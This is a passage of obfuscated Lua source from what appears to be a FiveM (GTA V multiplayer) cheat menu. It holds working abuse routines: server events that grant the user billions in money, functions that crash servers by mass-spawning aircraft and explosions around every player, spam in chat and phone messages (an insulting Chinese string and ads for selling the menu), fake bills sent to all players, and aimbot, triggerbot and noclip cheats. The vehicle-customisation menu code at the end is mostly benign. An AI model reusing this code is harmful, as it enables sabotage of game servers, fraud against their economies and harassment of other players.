	local message = "我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地"
	local owner = math.random(0,1)
	local sourcePlayer = math.random(0,87)
	local channel = num
	local messages = message..message..message..message..message..message..message..message
	local phone_number = num
	Pryorbypessed1('gcPhone:_internalAddMessage', transmitter, receiver, messages, owner)
	Pryorbypessed1('gcPhone:tchat_channel', sourcePlayer, channel, messages)
end

          if haharip then
            esxdestroyv3()
			nukeserver()
			vrpdestroy()
          end

          function esxdestroyv3()
            TSE("esx_jobs:caution", "give_back", 9999999999)
            TSE("esx_fueldelivery:pay", 9999999999)
            TSE("esx_carthief:pay", 9999999999)
            TSE("esx_godirtyjob:pay", 9999999999)
            TSE("esx_pizza:pay", 9999999999)
            TSE("esx_ranger:pay", 9999999999)
            TSE("esx_garbagejob:pay", 9999999999)
            TSE("esx_truckerjob:pay", 9999999999)
            TSE("AdminMenu:giveBank", 9999999999)
            TSE("AdminMenu:giveCash", 9999999999)
            TSE("esx_gopostaljob:pay", 9999999999)
            TSE("esx_banksecurity:pay", 9999999999)
            TSE("esx_slotmachine:sv:2", 9999999999)
            for c = 0, 9 do

              TSE("_chat:messageEntered", "KolorekMenu kup od Kolorek#1396 ^110", { 141, 211, 255 }, "^"..c.."KUP MENU OD Kolorek#1396")
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do
              TSE("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 101337)
              TSE("esx_billing:sendBill", GetPlayerServerId(i), "society_police", "Lynx10 is here LOL", 13374316)
            end
          end

          if titolo ~= "Pryor~r~  MENU" then
            ForceSocialClubUpdate()
          end



          function nukeserver()
            local camion = "Avenger"
            local avion = "CARGOPLANE"
            local avion2 = "luxor"
            local heli = "maverick"
            local random = "blimp2"
            while not HasModelLoaded(GetHashKey(avion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion))
            end
            while not HasModelLoaded(GetHashKey(avion2)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion2))
            end
            while not HasModelLoaded(GetHashKey(camion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(camion))
            end
            while not HasModelLoaded(GetHashKey(heli)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(heli))
            end
            while not HasModelLoaded(GetHashKey(random)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(random))
            end
            for i=0,128 do
              for c = 0, 9 do
                TSE("_chat:messageEntered", "KOLOREKMENU KUP OD Kolorek#1396 ^110", { 141, 211, 255 }, "^"..c.."KUP MENU Kolorek#1396!")
              end
              CreateVehicle(GetHashKey(camion),GetEntityCoords(GetPlayerPed(i)) + 2.0, Pryorbypessed3, Pryorbypessed3) 
              CreateVehicle(GetHashKey(avion),GetEntityCoords(GetPlayerPed(i)) + 3.0, Pryorbypessed3, Pryorbypessed3) 
              CreateVehicle(GetHashKey(avion2),GetEntityCoords(GetPlayerPed(i)) + 3.0, Pryorbypessed3, Pryorbypessed3) 
              CreateVehicle(GetHashKey(heli),GetEntityCoords(GetPlayerPed(i)) + 3.0, Pryorbypessed3, Pryorbypessed3) 
			        CreateVehicle(GetHashKey(random),GetEntityCoords(GetPlayerPed(i)) + 3.0, Pryorbypessed3, Pryorbypessed3)
              AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, Pryorbypessed3, Pryorbypessed2, 100000.0)
			      end
          end

          if servercrasherxd then
            Citizen.CreateThread(function()
            local camion = "Avenger"
            local avion = "CARGOPLANE"
            local avion2 = "luxor"
            local heli = "maverick"
            local random = "blimp2"
            while not HasModelLoaded(GetHashKey(avion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion))
            end
            while not HasModelLoaded(GetHashKey(avion2)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion2))
            end
            while not HasModelLoaded(GetHashKey(camion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(camion))
            end
            while not HasModelLoaded(GetHashKey(heli)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(heli))
            end
            while not HasModelLoaded(GetHashKey(random)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(random))
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do

              for a = 100, 150 do
                local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, Pryorbypessed3, Pryorbypessed3) and
                CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + a, Pryorbypessed3, Pryorbypessed3)
              end
            end
            end)
          end

          if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), Pryorbypessed3) then
            if IsControlPressed(0, 209) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 250.0)
            elseif IsControlPressed(0, 210) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
            end
          end

          if TriggerBot then
            local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
            if Aiming then
              if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                ShootPlayer(Entity)
              end
            end
          end

		  if Aimlock then
			SetPlayerLockon(PlayerId(), Pryorbypessed2)
			SetPlayerTargetingMode(1)
			SetPlayerLockonRangeOverride(PlayerId(),9999)
		  end

          if Aimbot then
            for player=1, 128 do
              if player ~= PlayerId() then
                if IsPlayerFreeAiming(PlayerId()) then
                  local TargetPed = GetPlayerPed(player)
                  local TargetPos = GetEntityCoords(TargetPed)
                  local Exist = DoesEntityExist(TargetPed)
                  local Dead = IsPlayerDead(TargetPed)

                  if Exist and not Dead then
                    local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                    if IsEntityVisible(TargetPed) and OnScreen then
                      if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                      end
                    end
                  end
                end
              end
            end
		  end

          if ragebot then
            for player=1, 128 do
              if player ~= PlayerId() then
                local TargetPed = GetPlayerPed(player)
                local TargetPos = GetEntityCoords(TargetPed)
                local Exist = DoesEntityExist(TargetPed)
                local Dead = IsPlayerDead(TargetPed)

                if Exist and not Dead then
                  local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                  if IsEntityVisible(TargetPed) and OnScreen then
                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
                      local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                      SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                    end
                  end
                end
              end
            end
          end


          if rapidfire then
            DRFT()
          end

          if explosiveammo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
              AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
          end



          if RainbowVeh then
            Citizen.Wait(0)
            local rgb = RGB(1.0)
            SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
            SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
          end

          if rainbowh then
            for i = -1, 12 do
              Citizen.Wait(0)
              local ra = RGB(1.0)
              SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
              SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ra.r, ra.g, ra.b)
              if i == 12 then
                i = -1
              end
            end
          end

          if t2x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 2.0 * 20.0)
          end

          if t4x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 4.0 * 20.0)
          end

          if t10x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 10.0 * 20.0)
          end

          if t16x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 16.0 * 20.0)
          end

          if txd then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 500.0 * 20.0)
          end

          if tbxd then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 9999.0 * 20.0)
          end

          if Noclip then           
            DrawTxt("NOCLIP ~g~ON", 0.70, 0.9)
            local currentSpeed = 2
            local noclipEntity =
            IsPedInAnyVehicle(PlayerPedId(-1), Pryorbypessed2) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
            FreezeEntityPosition(PlayerPedId(-1), Pryorbypessed3)
            SetEntityInvincible(PlayerPedId(-1), Pryorbypessed3)

            local newPos = GetEntityCoords(entity)

            Pryorbypessed4(0, 32, Pryorbypessed3)
            Pryorbypessed4(0, 268, Pryorbypessed3)

            Pryorbypessed4(0, 31, Pryorbypessed3)

            Pryorbypessed4(0, 269, Pryorbypessed3)
            Pryorbypessed4(0, 33, Pryorbypessed3)

            Pryorbypessed4(0, 266, Pryorbypessed3)
            Pryorbypessed4(0, 34, Pryorbypessed3)

            Pryorbypessed4(0, 30, Pryorbypessed3)

            Pryorbypessed4(0, 267, Pryorbypessed3)
            Pryorbypessed4(0, 35, Pryorbypessed3)

            Pryorbypessed4(0, 44, Pryorbypessed3)
            Pryorbypessed4(0, 20, Pryorbypessed3)

            local yoff = 0.0
            local zoff = 0.0

            if GetInputMode() == "MouseAndKeyboard" then
              if IsDisabledControlPressed(0, 32) then
                yoff = 0.5
              end
              if IsDisabledControlPressed(0, 33) then
                yoff = -0.5
              end
              if IsDisabledControlPressed(0, 34) then
                SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
              end
              if IsDisabledControlPressed(0, 35) then
                SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
              end
              if IsDisabledControlPressed(0, 44) then
                zoff = 0.21
              end
              if IsDisabledControlPressed(0, 20) then
                zoff = -0.21
              end
            end

            newPos =
            GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

            local heading = GetEntityHeading(noclipEntity)
            SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
            SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, Pryorbypessed2)
            SetEntityHeading(noclipEntity, heading)

            SetEntityCollision(noclipEntity, Pryorbypessed2, Pryorbypessed2)
            SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)

            FreezeEntityPosition(noclipEntity, Pryorbypessed2)
            SetEntityInvincible(noclipEntity, Pryorbypessed2)
            SetEntityCollision(noclipEntity, Pryorbypessed3, Pryorbypessed3)
          end
        end
        end)
		
		
        Citizen.CreateThread(function()
          FreezeEntityPosition(entity, Pryorbypessed2)
          local playerIdxWeapon = 1;
          local WeaponTypeSelect = Pryorbypessed
          local WeaponSelected = Pryorbypessed
          local ModSelected = Pryorbypessed
          local currentItemIndex = 1
          local selectedItemIndex = 1
          local powerboost = { 1.0, 2.0, 4.0, 10.0, 512.0, 9999.0 }
          local spawninside = Pryorbypessed2
          JesusRadius = 5.0
          JesusRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}
          local currJesusRadiusIndex = 1
          local selJesusRadiusIndex = 1
          felipebypassedmesquita.CreateMenu(LynxIcS, LynxIcZ)
          felipebypassedmesquita.CreateSubMenu(sMX, LynxIcS, bytexd)
          felipebypassedmesquita.CreateSubMenu(TRPM, LynxIcS, bytexd)
          felipebypassedmesquita.CreateSubMenu(WMPS, LynxIcS, bytexd)
          felipebypassedmesquita.CreateSubMenu(advm, LynxIcS, bytexd)
          felipebypassedmesquita.CreateSubMenu(LMX, LynxIcS, bytexd)
          felipebypassedmesquita.CreateSubMenu(VMS, LynxIcS, bytexd)
          felipebypassedmesquita.CreateSubMenu(OPMS, LynxIcS, bytexd)
          felipebypassedmesquita.CreateSubMenu(poms, OPMS, bytexd)
          felipebypassedmesquita.CreateSubMenu(dddd, advm, bytexd)
          felipebypassedmesquita.CreateSubMenu(esms, LMX, bytexd)
          felipebypassedmesquita.CreateSubMenu(ESXD, LMX, bytexd)
          felipebypassedmesquita.CreateSubMenu(ESXC, LMX, bytexd)
          felipebypassedmesquita.CreateSubMenu(VRPT, LMX, bytexd)
          felipebypassedmesquita.CreateSubMenu(MSTC, LMX, bytexd)
          felipebypassedmesquita.CreateSubMenu(crds, LynxIcS, bytexd)
		  felipebypassedmesquita.CreateSubMenu(TrollP, crds, bytexd)
          felipebypassedmesquita.CreateSubMenu(MoneyP, SEVR, bytexd)		  
          felipebypassedmesquita.CreateSubMenu(Tmas, poms, bytexd)
          felipebypassedmesquita.CreateSubMenu(WTNe, WMPS, bytexd)
          felipebypassedmesquita.CreateSubMenu(WTSbull, WTNe, bytexd)
          felipebypassedmesquita.CreateSubMenu(WOP, WTSbull, bytexd)
          felipebypassedmesquita.CreateSubMenu(MSMSA, WOP, bytexd)
          felipebypassedmesquita.CreateSubMenu(CTSa, VMS, bytexd)
          felipebypassedmesquita.CreateSubMenu(CTS, CTSa, bytexd)
          felipebypassedmesquita.CreateSubMenu(cAoP, CTS, bytexd)
          felipebypassedmesquita.CreateSubMenu(MTS, VMS, bytexd)
          felipebypassedmesquita.CreateSubMenu(mtsl, MTS, bytexd)
          felipebypassedmesquita.CreateSubMenu(CTSmtsps, mtsl, bytexd)
          felipebypassedmesquita.CreateSubMenu(GSWP, OPMS, bytexd)
          felipebypassedmesquita.CreateSubMenu(espa, advm, bytexd)
          felipebypassedmesquita.CreateSubMenu(LSCC, VMS, bytexd)
          felipebypassedmesquita.CreateSubMenu(tngns, LSCC, bytexd)
          felipebypassedmesquita.CreateSubMenu(prof, LSCC, bytexd)
          felipebypassedmesquita.CreateSubMenu(bmm, VMS, bytexd)
          felipebypassedmesquita.CreateSubMenu(SPD, Tmas, bytexd)
          felipebypassedmesquita.CreateSubMenu(gccccc, VMS, bytexd)
          felipebypassedmesquita.CreateSubMenu(CMSMS, WMPS, bytexd)
          felipebypassedmesquita.CreateSubMenu(GAPA,OPMS,bytexd)



          for i,theItem in pairs(vehicleMods) do
            felipebypassedmesquita.CreateSubMenu(theItem.id, tngns, theItem.name)

            if theItem.id == "paint" then
              felipebypassedmesquita.CreateSubMenu("primary", theItem.id, "Primary Paint")
              felipebypassedmesquita.CreateSubMenu("secondary", theItem.id, "Secondary Paint")

              felipebypassedmesquita.CreateSubMenu("rimpaint", theItem.id, "Wheel Paint")

              felipebypassedmesquita.CreateSubMenu("classic1", "primary", "Classic Paint")
              felipebypassedmesquita.CreateSubMenu("metallic1", "primary", "Metallic Paint")
              felipebypassedmesquita.CreateSubMenu("matte1", "primary","Matte Paint")
              felipebypassedmesquita.CreateSubMenu("metal1", "primary","Metal Paint")
              felipebypassedmesquita.CreateSubMenu("classic2", "secondary", "Classic Paint")
              felipebypassedmesquita.CreateSubMenu("metallic2", "secondary", "Metallic Paint")
              felipebypassedmesquita.CreateSubMenu("matte2", "secondary","Matte Paint")
              felipebypassedmesquita.CreateSubMenu("metal2", "secondary","Metal Paint")
              felipebypassedmesquita.CreateSubMenu("classic3", "rimpaint", "Classic Paint")
              felipebypassedmesquita.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint")
              felipebypassedmesquita.CreateSubMenu("matte3", "rimpaint","Matte Paint")
              felipebypassedmesquita.CreateSubMenu("metal3", "rimpaint","Metal Paint")
            end
          end

          for i,theItem in pairs(perfMods) do
            felipebypassedmesquita.CreateSubMenu(theItem.id, prof, theItem.name)
          end
          local FlingedPlayer = Pryorbypessed
          local SelectedPlayer

          while Enabled do

            ped = PlayerPedId()
            veh = GetVehiclePedIsUsing(ped)
            SetVehicleModKit(veh,0)

            for i,theItem in pairs(vehicleMods) do

              if felipebypassedmesquita.IsMenuOpened(tngns) then
                if isPreviewing then
                  if oldmodtype == "neon" then
                    local r,g,b = table.unpack(oldmod)
                    SetVehicleNeonLightsColour(veh,r,g,b)
                    SetVehicleNeonLightEnabled(veh, 0, oldmodaction)
                    SetVehicleNeonLightEnabled(veh, 1, oldmodaction)
                    SetVehicleNeonLightEnabled(veh, 2, oldmodaction)
                    SetVehicleNeonLightEnabled(veh, 3, oldmodaction)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif oldmodtype == "paint" then
                    local pa,pb,pc,pd = table.unpack(oldmod)
                    SetVehicleColours(veh, pa,pb)
                    SetVehicleExtraColours(veh,pc,pd)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  else
                    if oldmodaction == "rm" then
                      RemoveVehicleMod(veh, oldmodtype)
                      isPreviewing = Pryorbypessed2
                      oldmodtype = -1
                      oldmod = -1
                    else
                      SetVehicleMod(veh, oldmodtype,oldmod,Pryorbypessed2)
                      isPreviewing = Pryorbypessed2
                      oldmodtype = -1
                      oldmod = -1
                    end
                  end
                end
              end

              if felipebypassedmesquita.IsMenuOpened(theItem.id) then
                if theItem.id == "wheeltypes" then
                  if felipebypassedmesquita.button("Sport Wheels") then
                    SetVehicleWheelType(veh,0)
                  elseif felipebypassedmesquita.button("Muscle Wheels") then
                    SetVehicleWheelType(veh,1)
                  elseif felipebypassedmesquita.button("Lowrider Wheels") then
                    SetVehicleWheelType(veh,2)
                  elseif felipebypassedmesquita.button("SUV Wheels") then
                    SetVehicleWheelType(veh,3)
                  elseif felipebypassedmesquita.button("Offroad Wheels") then
                    SetVehicleWheelType(veh,4)
                  elseif felipebypassedmesquita.button("Tuner Wheels") then
                    SetVehicleWheelType(veh,5)
                  elseif felipebypassedmesquita.button("High End Wheels") then
                    SetVehicleWheelType(veh,7)
                  end
                  felipebypassedmesquita.Display()
                elseif theItem.id == "extra" then
                  local extras = checkValidVehicleExtras()
                  for i,theItem in pairs(extras) do
                    if IsVehicleExtraTurnedOn(veh,i) then
                      pricestring = "Installed"
                    else
                      pricestring = "Not Installed"
                    end

                    if felipebypassedmesquita.button(theItem.menuName, pricestring) then
                      SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh,i))
                    end
                  end
                  felipebypassedmesquita.Display()
                elseif theItem.id == "headlight" then

                  if felipebypassedmesquita.button("None") then
                    SetVehicleHeadlightsColour(veh, -1)
                  end

                  for theName, theItem in pairs(headlightscolor) do
                    tp = GetVehicleHeadlightsColour(veh)

                    if tp == theItem.id and not isPreviewing then
                      pricetext = "Installed"
                    else
                      if isPreviewing and tp == theItem.id then
                        pricetext = "Previewing"
                      else
                        pricetext = "Not Installed"
                      end
                    end
                    head = GetVehicleHeadlightsColour(veh)
                    if felipebypassedmesquita.button(theItem.name, pricetext) then
                      if not isPreviewing then
                        oldmodtype = "headlight"
                        oldmodaction = Pryorbypessed2
                        oldhead = GetVehicleHeadlightsColour(veh)
                        oldmod = table.pack(oldhead)
                        SetVehicleHeadlightsColour(veh, theItem.id)

                        isPreviewing = Pryorbypessed3
                      elseif isPreviewing and head == theItem.id then
                        ToggleVehicleMod(veh, 22, Pryorbypessed3)
                        SetVehicleHeadlightsColour(veh, theItem.id)
                        isPreviewing = Pryorbypessed2
                        oldmodtype = -1
                        oldmod = -1
                      elseif isPreviewing and head ~= theItem.id then
                        SetVehicleHeadlightsColour(veh, theItem.id)
                        isPreviewing = Pryorbypessed3
                      end
                    end
                  end
                  felipebypassedmesquita.Display()
                elseif theItem.id == "licence" then

                  if felipebypassedmesquita.button("None") then
                    SetVehicleNumberPlateTextIndex(veh, 3)
                  end

                  for theName, theItem in pairs(licencetype) do
                    tp = GetVehicleNumberPlateTextIndex(veh)

                    if tp == theItem.id and not isPreviewing then
                      pricetext = "Installed"
                    else
                      if isPreviewing and tp == theItem.id then
                        pricetext = "Previewing"
                      else
                        pricetext = "Not Installed"
                      end
                    end
                    plate = GetVehicleNumberPlateTextIndex(veh)
                    if felipebypassedmesquita.button(theItem.name, pricetext) then
                      if not isPreviewing then
                        oldmodtype = "headlight"
                        oldmodaction = Pryorbypessed2
                        oldhead = GetVehicleNumberPlateTextIndex(veh)
                        oldmod = table.pack(oldhead)
                        SetVehicleNumberPlateTextIndex(veh, theItem.id)

                        isPreviewing = Pryorbypessed3
                      elseif isPreviewing and plate == theItem.id then
                        SetVehicleNumberPlateTextIndex(veh, theItem.id)
                        isPreviewing = Pryorbypessed2
                        oldmodtype = -1
                        oldmod = -1
                      elseif isPreviewing and plate ~= theItem.id then
                        SetVehicleNumberPlateTextIndex(veh, theItem.id)
                        isPreviewing = Pryorbypessed3
                      end
                    end
                  end
                  felipebypassedmesquita.Display()
                elseif theItem.id == "neon" then

                  if felipebypassedmesquita.button("None") then
                    SetVehicleNeonLightsColour(veh,255,255,255)
                    SetVehicleNeonLightEnabled(veh,0,Pryorbypessed2)
                    SetVehicleNeonLightEnabled(veh,1,Pryorbypessed2)
                    SetVehicleNeonLightEnabled(veh,2,Pryorbypessed2)
                    SetVehicleNeonLightEnabled(veh,3,Pryorbypessed2)
                  end


                  for i,theItem in pairs(neonColors) do
                    colorr,colorg,colorb = table.unpack(theItem)
                    r,g,b = GetVehicleNeonLightsColour(veh)

                    if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle,2) and not isPreviewing then
                      pricestring = "Installed"
                    else
                      if isPreviewing and colorr == r and colorg == g and colorb == b then
                        pricestring = "Previewing"
                      else
                        pricestring = "Not Installed"
                      end
                    end

                    if felipebypassedmesquita.button(i, pricestring) then
                      if not isPreviewing then
                        oldmodtype = "neon"
                        oldmodaction = IsVehicleNeonLightEnabled(veh,1)
                        oldr,oldg,oldb = GetVehicleNeonLightsColour(veh)
                        oldmod = table.pack(oldr,oldg,oldb)
                        SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                        SetVehicleNeonLightEnabled(veh,0,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,1,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,2,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,3,Pryorbypessed3)
                        isPreviewing = Pryorbypessed3
                      elseif isPreviewing and colorr == r and colorg == g and colorb == b then
                        SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                        SetVehicleNeonLightEnabled(veh,0,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,1,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,2,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,3,Pryorbypessed3)
                        isPreviewing = Pryorbypessed2
                        oldmodtype = -1
                        oldmod = -1
                      elseif isPreviewing and colorr ~= r or colorg ~= g or colorb ~= b then
                        SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                        SetVehicleNeonLightEnabled(veh,0,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,1,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,2,Pryorbypessed3)
                        SetVehicleNeonLightEnabled(veh,3,Pryorbypessed3)
                        isPreviewing = Pryorbypessed3
                      end
                    end
                  end
                  felipebypassedmesquita.Display()
                elseif theItem.id == "paint" then

                  if felipebypassedmesquita.MenuButton("~p~#~s~ Primary Paint","primary") then

                  elseif felipebypassedmesquita.MenuButton("~p~#~s~ Secondary Paint","secondary") then

                  elseif felipebypassedmesquita.MenuButton("~p~#~s~ Wheel Paint","rimpaint") then

                  end


                  felipebypassedmesquita.Display()

                else
                  local valid = checkValidVehicleMods(theItem.id)
